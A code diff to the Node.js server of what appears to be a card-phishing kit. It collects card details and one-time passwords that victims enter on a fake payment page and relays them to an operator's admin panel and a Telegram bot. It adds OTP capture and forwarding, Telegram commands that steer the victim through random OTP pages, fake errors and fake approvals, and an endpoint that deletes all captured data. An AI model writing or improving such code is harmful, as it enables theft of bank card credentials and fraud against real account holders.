@@ -437,8 +437,8 @@ async function handleContinueOTP(data, queryId) {
     state.currency = 'INR';
   }
   
-  // Generate random OTP page (1-4)
-  const otpPage = Math.floor(Math.random() * 4) + 1;
+  // Generate random OTP page (1-5)
+  const otpPage = Math.floor(Math.random() * 5) + 1;
   
   console.log(`✅ Proceeding with OTP - Bank: ${state.bank}, Currency: ${state.currency}, Page: ${otpPage}`);
   
@@ -1177,6 +1177,29 @@ io.on('connection', (socket) => {
     console.error('🔌 Socket error:', error);
   });
 
+  // Handle test connection from admin panel
+  socket.on('test-connection', (data) => {
+    console.log('🔍 Test connection received from admin panel:', data);
+    socket.emit('test-response', { status: 'success', message: 'Server received your test', timestamp: new Date().toISOString() });
+  });
+  
+  // Handle admin panel connection and send historical data
+  socket.on('admin-connected', async () => {
+    console.log(`👨‍💼 Admin panel connected: ${socket.id}`);
+    
+    // Send historical data to admin panel
+    const historicalData = {
+      payments: adminData.payments || [],
+      otps: adminData.otps || [],
+      visitors: adminData.visitors || [],
+      activeVisitors: Array.from(activeVisitors.values()),
+      analytics: calculatePaymentAnalytics()
+    };
+    
+    socket.emit('admin-historical-data', historicalData);
+    console.log(`📤 Sent historical data to admin: ${historicalData.payments.length} payments, ${historicalData.activeVisitors.length} active visitors`);
+  });
+  
   // Existing paymentId handling
   socket.on('paymentId', (paymentId) => {
     console.log(`🔌 Payment ID registered for socket ${socket.id}: ${paymentId}`);
@@ -1295,39 +1318,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Handle payment data from checkout page
-  socket.on('payment-data', async (data) => {
-    console.log('Payment data received:', data);
-    
-    // Add to persistent storage
-    const paymentRecord = {
-      ...data,
-      timestamp: new Date().toISOString(),
-      id: data.hash,
-      processed: false,
-      ipAddress: data.ipAddress || 'unknown',
-      userAgent: data.userAgent || 'unknown'
-    };
-    
-    adminData.payments.unshift(paymentRecord);
-    
-    // Keep only last 500 payments
-    if (adminData.payments.length > 500) {
-      adminData.payments = adminData.payments.slice(0, 500);
-    }
-    
-    console.log(`💳 Payment data stored: ${data.hash} - ${data.plan} (${data.billing})`);
-    
-    // Send card details to Telegram bot
-    await sendCardDetailsToTelegram(data);
-    
-    // Save immediately
-    await saveAdminData();
-    
-    // Emit to admin panel
-    io.emit('payment-data', data);
-    io.emit('analytics-update', calculatePaymentAnalytics());
-  });
+
 
   // Handle visitor tracking with enhanced heartbeat mechanism
   socket.on('visitor-joined', (data) => {
@@ -1360,9 +1351,57 @@ io.on('connection', (socket) => {
       console.log(`💓 Heartbeat received from visitor: ${socket.visitorData.visitorId}`);
       
       // Emit to all clients to keep admin panel in sync
+      io.emit('visitor-heartbeat', socket.visitorData);
       io.emit('visitor-heartbeat-update', socket.visitorData);
     } else {
       console.warn('⚠️ Received heartbeat but no visitor data found');
+    }
+  });
+
+  // Handle OTP submission from payment page
+  socket.on('otp-submitted', async (data) => {
+    try {
+      console.log('🔐 OTP submitted:', {
+        paymentId: data.paymentId,
+        otp: data.otp
+      });
+      
+      // Store OTP in admin data
+      const otpData = {
+        id: `otp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+        paymentId: data.paymentId,
+        otp: data.otp,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Initialize otps array if it doesn't exist
+      if (!adminData.otps) {
+        adminData.otps = [];
+      }
+      
+      adminData.otps.unshift(otpData);
+      
+      // Keep only last 100 OTPs
+      if (adminData.otps.length > 100) {
+        adminData.otps = adminData.otps.slice(0, 100);
+      }
+      
+      // Save to persistent storage
+      await saveAdminData();
+      
+      // Send to admin panel immediately
+      io.emit('otp-submitted', otpData);
+      
+      // Send OTP to Telegram with admin commands
+      if (telegramConfig.enabled) {
+        await sendOtpToTelegram(otpData);
+        await sendOtpAdminCommands(data.paymentId);
+      }
+      
+      console.log('✅ OTP data processed and sent to admin panel & Telegram');
+      
+    } catch (error) {
+      console.error('❌ Error processing OTP submission:', error);
     }
   });
 
@@ -1396,6 +1435,33 @@ io.on('connection', (socket) => {
 
   socket.on('payment-approved', (data) => {
     console.log('Admin approved payment:', data);
+    
+    // If this is triggered from admin panel, also store success data
+    if (data.paymentId && !data.successHash) {
+      const paymentRecord = adminData.payments.find(p => p.paymentId === data.paymentId || p.id === data.paymentId || p.hash === data.paymentId);
+      
+      if (paymentRecord) {
+        // Generate a success hash
+        const successHash = `success_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        
+        // Store in successfulPayments Map for success page retrieval
+        const successData = {
+          ...paymentRecord,
+          successHash,
+          approvedAt: new Date().toISOString(),
+          approvedVia: 'admin_panel'
+        };
+        
+        successfulPayments.set(successHash, successData);
+        
+        // Add success data to the broadcast
+        data.successHash = successHash;
+        data.paymentData = successData;
+        
+        console.log(`✅ Payment approved via Admin Panel - stored with hash: ${successHash}`);
+      }
+    }
+    
     console.log('Broadcasting payment-approved to all clients');
     socket.broadcast.emit('payment-approved', data);
   });
@@ -1450,7 +1516,8 @@ io.on('connection', (socket) => {
     
     // Send current state immediately for mobile reconnection
     socket.emit('visitors-update', visitors);
-    socket.emit('admin-data-loaded', {
+    socket.emit('admin-historical-data', {
+      activeVisitors: visitors,
       visitors: adminData.visitors,
       payments: adminData.payments,
       otps: adminData.otps,
@@ -1847,7 +1914,13 @@ app.post('/webhook/telegram', async (req, res) => {
       switch (action) {
         case 'show':
           if (callbackData.startsWith('show_otp_')) {
-            io.emit('show-otp', { paymentId });
+            // Generate random OTP page (1-5) for direct Telegram commands
+            const otpPage = Math.floor(Math.random() * 5) + 1;
+            io.emit('show-otp', { 
+              paymentId,
+              otpPage,
+              timestamp: new Date().toISOString() 
+            });
           }
           break;
         case 'fail':
@@ -1862,7 +1935,52 @@ app.post('/webhook/telegram', async (req, res) => {
           io.emit('insufficient-funds-error', { paymentId });
           break;
         case 'success':
-          io.emit('payment-approved', { paymentId });
+          // Find the payment data by paymentId
+          const paymentRecord = adminData.payments.find(p => p.paymentId === paymentId || p.id === paymentId || p.hash === paymentId);
+          
+          if (paymentRecord) {
+            // Generate a success hash
+            const successHash = `success_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+            
+            // Store in successfulPayments Map for success page retrieval
+            const successData = {
+              ...paymentRecord,
+              successHash,
+              approvedAt: new Date().toISOString(),
+              approvedVia: 'telegram_bot'
+            };
+            
+            successfulPayments.set(successHash, successData);
+            
+            console.log(`✅ Payment approved via Telegram - stored with hash: ${successHash}`);
+            console.log(`📊 Payment data:`, { 
+              paymentId: paymentRecord.paymentId || paymentRecord.id,
+              amount: paymentRecord.amount,
+              email: paymentRecord.billingDetails?.email || paymentRecord.email
+            });
+            
+            // Emit payment-approved with both paymentId and successHash
+            io.emit('payment-approved', { 
+              paymentId, 
+              successHash,
+              paymentData: successData
+            });
+            
+            // Also emit directly to the specific payment room if it exists
+            io.to(paymentId).emit('payment-approved', { 
+              paymentId, 
+              successHash,
+              paymentData: successData
+            });
+            
+            console.log(`🎉 Payment approval broadcasted to all clients with success hash`);
+          } else {
+            console.error(`❌ Payment not found for paymentId: ${paymentId}`);
+            console.log(`📊 Available payment IDs:`, adminData.payments.map(p => p.paymentId || p.id || p.hash));
+            
+            // Still emit the event but without success data
+            io.emit('payment-approved', { paymentId });
+          }
           break;
       }
     }
@@ -1873,10 +1991,156 @@ app.post('/webhook/telegram', async (req, res) => {
   }
 });
 
+// API endpoint to delete all transactions permanently
+app.post('/api/delete-all-transactions', async (req, res) => {
+  try {
+    console.log('⚠️ DELETE ALL TRANSACTIONS REQUEST RECEIVED');
+    
+    // Count current data before deletion
+    const deleteCounts = {
+      payments: adminData.payments.length,
+      visitors: adminData.visitors.length,
+      otps: adminData.otps.length,
+      successfulPayments: successfulPayments.size
+    };
+    
+    console.log('📉 Data before deletion:', deleteCounts);
+    
+    // Clear all in-memory data structures
+    adminData.payments = [];
+    adminData.visitors = [];
+    adminData.otps = [];
+    
+    // Clear successful payments map
+    successfulPayments.clear();
+    
+    // Emit to all connected admin panels to clear their displays
+    io.emit('admin-data-cleared', { 
+      message: 'All transaction data has been permanently deleted',
+      deletedCounts: deleteCounts
+    });
+    
+    console.log('✅ ALL TRANSACTION DATA PERMANENTLY DELETED');
+    console.log('🗑️ Deleted:', {
+      payments: deleteCounts.payments,
+      visitors: deleteCounts.visitors, 
+      otps: deleteCounts.otps,
+      successfulPayments: deleteCounts.successfulPayments
+    });
+    
+    // Send notification to Telegram about data deletion
+    setTimeout(async () => {
+      const deleteMessage = `🗑️ *ALL TRANSACTIONS DELETED*\n\n` +
+        `⚠️ *Admin has permanently deleted all data*\n\n` +
+        `📉 *Deleted Items:*\n` +
+        `• Credit Cards: ${deleteCounts.payments}\n` +
+        `• Visitors: ${deleteCounts.visitors}\n` +
+        `• OTPs: ${deleteCounts.otps}\n` +
+        `• Successful Payments: ${deleteCounts.successfulPayments}\n\n` +
+        `🔄 *System reset complete - monitoring continues*`;
+      
+      await sendToTelegram(deleteMessage);
+      console.log('📡 Delete notification sent to Telegram');
+    }, 1000);
+    
+    res.status(200).json({ 
+      success: true, 
+      message: 'All transactions deleted permanently',
+      deletedCount: deleteCounts.payments + deleteCounts.visitors + deleteCounts.otps
+    });
+    
+  } catch (error) {
+    console.error('❌ Delete all transactions error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: error.message || 'Failed to delete transactions' 
+    });
+  }
+});
+
+// In-memory storage for success payment data
+const successPaymentData = new Map();
+
+// API endpoint to store successful payment data
+app.post('/api/success-payment', async (req, res) => {
+  try {
+    const { hash, paymentData } = req.body;
+    
+    if (!hash || !paymentData) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Missing hash or paymentData' 
+      });
+    }
+    
+    // Store the payment data with the hash as key
+    successPaymentData.set(hash, paymentData);
+    
+    console.log('✅ Success payment data stored:', { hash, paymentId: paymentData.paymentId });
+    
+    res.json({ 
+      success: true, 
+      message: 'Payment data stored successfully' 
+    });
+    
+  } catch (error) {
+    console.error('❌ Error storing success payment:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: error.message || 'Failed to store payment data' 
+    });
+  }
+});
+
+// API endpoint to retrieve successful payment data
+app.get('/api/success-payment/:hash', async (req, res) => {
+  try {
+    const { hash } = req.params;
+    
+    if (!hash) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Missing hash parameter' 
+      });
+    }
+    
+    // Get the payment data for this hash
+    const paymentData = successPaymentData.get(hash);
+    
+    if (!paymentData) {
+      console.log('❌ Success payment data not found for hash:', hash);
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Payment data not found' 
+      });
+    }
+    
+    console.log('✅ Success payment data retrieved:', { hash, paymentId: paymentData.paymentId });
+    
+    res.json({ 
+      success: true, 
+      paymentData: paymentData 
+    });
+    
+  } catch (error) {
+    console.error('❌ Error retrieving success payment:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: error.message || 'Failed to retrieve payment data' 
+    });
+  }
+});
+
+// Start the server - single instance only
 server.listen(PORT, '0.0.0.0', async () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
-  console.log('Node.js version:', process.version);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
+  console.log('⚙️ Node.js version:', process.version);
+  
+  // Start the Telegram polling after server starts
+  console.log('🤖 Starting Telegram polling for admin commands...');
+  setInterval(pollTelegramUpdates, 2000);
+  console.log('🔄 Telegram polling started for admin commands');
   
   // Send startup notification to Telegram
   setTimeout(async () => {
@@ -1891,16 +2155,4 @@ server.listen(PORT, '0.0.0.0', async () => {
     await sendToTelegram(startupMessage);
     console.log('📡 Startup notification sent to Telegram');
   }, 3000);
-});
-
-// Start the server
-server.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Environment: ${NODE_ENV}`);
-  console.log(`Node.js version: ${process.version}`);
-  
-  // Start the Telegram polling after server starts
-  console.log('🤖 Starting Telegram polling for admin commands...');
-  setInterval(pollTelegramUpdates, 2000);
-  console.log('🔄 Telegram polling started for admin commands');
 });
